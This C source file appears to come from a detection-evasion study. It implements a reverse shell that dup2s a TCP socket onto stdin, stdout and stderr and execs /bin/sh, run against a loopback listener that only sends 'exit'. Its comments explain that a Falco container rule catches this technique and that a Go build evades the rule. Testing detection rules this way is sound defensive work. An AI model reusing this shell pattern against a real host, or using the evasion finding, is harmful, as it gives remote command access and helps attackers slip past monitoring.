/* reverse_shell composite (ATT&CK T1059) -- stdio-over-socket.
 *
 * The idiomatic native reverse shell, and THE substrate mover for this study:
 * open a TCP socket, dup2 it directly onto stdin/stdout/stderr, exec /bin/sh.
 * Falco's container rule "Redirect STDOUT/STDIN to Network Connection in
 * Container" keys on a dup of a socket fd (fd.type in ipv4/ipv6) onto fd 0/1/2,
 * so C/C++/Rust -- which dup the socket itself -- FIRE. The Go build of this
 * composite uses os/exec, which pipe-relays (fd.type=fifo) and EVADES: same
 * behaviour, different runtime I/O model, different fd.type. That contrast is
 * the mechanism-keyed fragility result.
 *
 * Self-contained, benign, deterministic: the parent process is a loopback
 * listener on 127.0.0.1:4444 that accepts the shell's connection and sends
 * "exit\n", so the exec'd shell runs only the `exit` builtin and terminates --
 * no external network, no real command execution. Detonates in a container. */
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#define PORT 4444

int main(void) {
    int lst = socket(AF_INET, SOCK_STREAM, 0);
    if (lst < 0) {
        return 1;
    }
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof addr);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons(PORT);
    int one = 1;
    setsockopt(lst, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);
    if (bind(lst, (struct sockaddr *)&addr, sizeof addr) != 0 || listen(lst, 1) != 0) {
        return 1;
    }

    pid_t pid = fork();
    if (pid < 0) {
        return 1;
    }
    if (pid == 0) {
        /* child: the reverse shell */
        close(lst);
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0 || connect(s, (struct sockaddr *)&addr, sizeof addr) != 0) {
            _exit(1);
        }
        dup2(s, 0); /* socket -> stdin  : the mechanism Falco fires on */
        dup2(s, 1); /* socket -> stdout */
        dup2(s, 2); /* socket -> stderr */
        execl("/bin/sh", "sh", (char *)0);
        _exit(127);
    }

    /* parent: drive the shell to exit, then reap it */
    int c = accept(lst, 0, 0);
    if (c >= 0) {
        write(c, "exit\n", 5);
        char b[64];
        while (read(c, b, sizeof b) > 0) {
        }
        close(c);
    }
    close(lst);
    int st;
    waitpid(pid, &st, 0);
    return 0;
}
